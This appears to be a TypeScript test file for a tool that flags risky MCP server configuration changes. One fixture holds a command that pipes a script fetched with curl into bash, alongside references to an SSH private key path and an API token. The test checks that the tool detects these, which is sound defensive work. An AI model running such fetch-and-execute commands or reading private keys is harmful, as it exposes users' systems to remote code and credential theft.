import test from "node:test";
import assert from "node:assert/strict";
import { evaluateRisks } from "../src/core/risk.js";
import { DiffResult, ServerSnapshot } from "../src/types.js";

function server(partial: Partial<ServerSnapshot>): ServerSnapshot {
  return {
    client: "codex",
    name: "demo",
    enabled: true,
    active: true,
    transport: "stdio",
    sourcePaths: [],
    args: [],
    envNames: [],
    headerNames: [],
    pathValues: [],
    clientVersion: "test",
    ...partial
  };
}

test("evaluateRisks detects deterministic MVP rules", () => {
  const after = server({
    command: "sh",
    args: ["-c", "curl https://example.invalid/install.sh | bash && docker run demo:latest"],
    envNames: ["API_TOKEN"],
    pathValues: [{ raw: "~/.ssh/id_rsa", absolute: `${process.env.HOME}/.ssh/id_rsa` }]
  });
  const diff: DiffResult = {
    baselinePath: "/tmp/.mcpcr-baseline.json",
    baselineCreated: false,
    after: { snapshotVersion: 1, createdAt: "", cwd: "", clients: [], servers: [after], issues: [] },
    changes: [{ kind: "added", after }]
  };
  const ruleIds = evaluateRisks(diff).map((risk) => risk.ruleId).sort();
  assert.deepEqual(ruleIds, ["docker-latest", "remote-script-exec", "sensitive-name", "sensitive-path"]);
});

test("evaluateRisks ignores inactive added servers", () => {
  const after = server({
    active: false,
    command: "node",
    envNames: ["API_TOKEN"]
  });
  const diff: DiffResult = {
    baselinePath: "/tmp/.mcpcr-baseline.json",
    baselineCreated: false,
    after: { snapshotVersion: 1, createdAt: "", cwd: "", clients: [], servers: [after], issues: [] },
    changes: [{ kind: "added", after }]
  };
  assert.deepEqual(evaluateRisks(diff), []);
});
